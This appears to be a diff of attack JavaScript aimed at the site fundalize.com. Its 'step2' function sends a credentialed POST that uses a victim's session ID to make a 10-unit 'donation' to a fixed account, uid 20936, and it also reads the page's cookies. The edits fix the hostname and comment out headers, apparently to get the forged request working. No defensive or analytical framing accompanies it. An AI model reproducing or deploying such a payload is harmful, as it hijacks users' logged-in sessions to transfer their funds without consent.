@@ -25,7 +25,7 @@ function getSID(){
 
 function step2(){
 	var xhttp = new XMLHttpRequest();
-	xhttp.open('POST', 'http://fundalize.com/includes/ajax_useractions.php', true);
+	xhttp.open('POST', 'http://www.fundalize.com/includes/ajax_useractions.php', true);
 	xhttp.withCredentials = true;
 	var cookies = document.cookie;
 	var params = 'uid=20936&pid='+user_id+'&amount=10&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
@@ -34,8 +34,8 @@ function step2(){
 	
 	
 	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
-	xhttp.setRequestHeader("Content-length", params.length);
-	xhttp.setRequestHeader("Host", "www.fundalize.com");
+	//xhttp.setRequestHeader("Content-length", params.length);
+	//xhttp.setRequestHeader("Host", "www.fundalize.com");
 	//xhttp.setRequestHeader("Cookie", cookies);
 	xhttp.send(params); 
 	
